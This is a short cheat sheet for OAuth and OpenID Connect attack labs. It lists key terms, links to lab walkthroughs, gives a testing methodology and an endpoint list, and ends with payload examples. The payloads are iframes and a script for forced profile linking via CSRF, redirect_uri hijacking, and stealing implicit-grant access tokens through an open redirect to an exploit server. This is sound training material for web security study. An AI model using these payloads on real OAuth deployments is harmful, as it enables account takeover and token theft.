# OAuth - CHEATSHEET + MOST IMPORTANT LABS

## Key Terms
```bash
- SAML based SSO (single sign-on)
- OpenID Connect
- OAuth Grant Types:
	> authorization code
	> implicit (token via browser)
```
## Walkthrough - Most Important Labs
- [Forced-OAuth-profile-linking-(no-state-param+CSRF)](Forced-OAuth-profile-linking-(no-state-param+CSRF).md)

- [OAuth-account-hijacking-via-redirect_uri](OAuth-account-hijacking-via-redirect_uri.md)

- [SSRF-via-OpenID-dynamic-client-registration](SSRF-via-OpenID-dynamic-client-registration.md)

- [Stealing-OAuth-access-tokens-via-an-open-redirect-(implicit)](Stealing-OAuth-access-tokens-via-an-open-redirect-(implicit).md)

## Methodology
```bash
- Search for a specific provider and look for endpoints in the documentation
- response_type=token? -> implicit grant
- No state param? -> CSRF
- OpenID? -> try register + SSRF
- redirect_url? 
    > try arbitrary redirect
    > try path traversal
```
## Cheat Sheet
```bash
# OPENID CONNECT
/.well-known/openid-configuration 
/.well-known/jwks.json
/reg -> redirect_uris, logo_uri  -> register user + obtain  client_id +  SSRF
/client/<client_id/logo 
```
## Payloads examples
```js
<iframe src="<IP>/oauth-linking?code=STOLEN-CODE"></iframe>
//----------------------//
<iframe src="https://<OAUTH-IP>/auth?client_id=<YOUR-CLIENT-ID>f&redirect_uri=<EXPLOIT-SV>&response_type=code&scope=openid%20profile%20email"hidden="hidden"></iframe>
//----------------------//
<script>
  if (!document.location.hash) {
    window.location = 'https://<OAUTH-IP>/auth?client_id=g4c0gltgknmy2ycmupioa&redirect_uri=<IP-LAB>/oauth-callback/../post/next?path=https://<EXPLOIT-SV>&response_type=token&nonce=1727033259&scope=openid%20profile%20email';
  } else {
    window.location = '/?' + document.location.hash.substr(1);
  }
</script>
```


